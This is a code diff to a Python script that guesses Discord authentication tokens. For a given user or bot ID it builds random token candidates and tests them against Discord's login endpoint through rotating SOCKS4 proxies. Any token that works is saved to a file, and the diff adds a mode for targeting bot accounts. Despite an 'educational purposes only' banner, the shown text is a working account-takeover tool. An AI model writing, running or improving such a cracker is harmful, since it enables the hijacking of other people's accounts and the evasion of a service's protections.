@@ -14,10 +14,11 @@ invaild = 0
 total_proxy = 0
 bad_proxy = 0
 
-userid = base64.b64encode((input("UserID: ")).encode("ascii"))
+mode = input("Cracker Mode | User/Bot | 0 / 1: ")
+
+userid = base64.b64encode((input("User / Bot ID: ")).encode("ascii"))
 userid = str(userid)[2:-1]
 print("WARNING: Educational purposes only!")
-time.sleep(3)
 
 proxies = set()
 with open("./proxy/socks4.txt", "r") as file:
@@ -37,16 +38,20 @@ while userid == userid:
         return ''.join(random.choice(chars) for _ in range(N))
 
     token = userid + '.' + timest(chars=ts) + '.' + HMAC(chars=ts)
+
+    if mode == "0":
+        checkerheaders = {'Authorization': token}
+    elif mode == "1":
+        checkerheaders = {'Authorization': f'Bot {token}'}
+    else:
+        print(Fore.RED + "Invaild Mode!")
+        break
     
     proxy = random.choice(list(proxies))
     proxy_form = {'http': f"socks4://{proxy}", 'https': f"socks4://{proxy}"}
 
-    headers={
-    'Authorization': token
-    }
-    url = 'https://discordapp.com/api/v9/auth/login'
     try:
-        login = requests.get(url, headers=headers, proxies=proxy_form, timeout=6000)
+        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=checkerheaders, proxies=proxy_form, timeout=6000)
         if login.status_code == 200:
             print(Fore.GREEN + '[+] VALID' + ' ' + token)
             f = open('done.txt', "a+")
